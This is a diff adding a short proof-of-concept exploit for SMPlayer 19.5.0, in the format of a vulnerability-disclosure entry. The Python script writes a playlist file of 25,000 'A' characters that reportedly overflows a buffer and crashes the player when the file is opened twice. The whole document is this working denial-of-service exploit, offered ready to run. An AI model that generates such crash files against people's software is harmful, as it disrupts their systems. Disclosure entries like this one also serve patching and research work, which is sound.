@@ -1,0 +1,23 @@
+# Title : SMPlayer 19.5.0 - Denial of Service (PoC)
+# Tested on : Windows 7 (64 bit)
+# Vulnerable Software: SMPlayer v 19.5.0
+# Exploit Author: Malav Vyas
+# Vendor Homepage: https://smplayer.info
+# Version : 19.5.0
+# Software Link : https://smplayer.info/en/downloads
+
+# POC
+# run this python file, which will generate attack.m3u file
+# .m3u file is used as a playlist
+# this python file will generate a .m3u file with 25000 "A" characters.
+# Open this file in SMPlayer two times.
+# second time, buffer would be successfully overflowed and it would result in a Denial Of Service attack.
+# For more details, please refer to video
+
+f="attack.m3u"
+
+bof = "A"*25000
+
+writeFile = open(f, "w")
+writeFile.write(bof)
+writeFile.close()
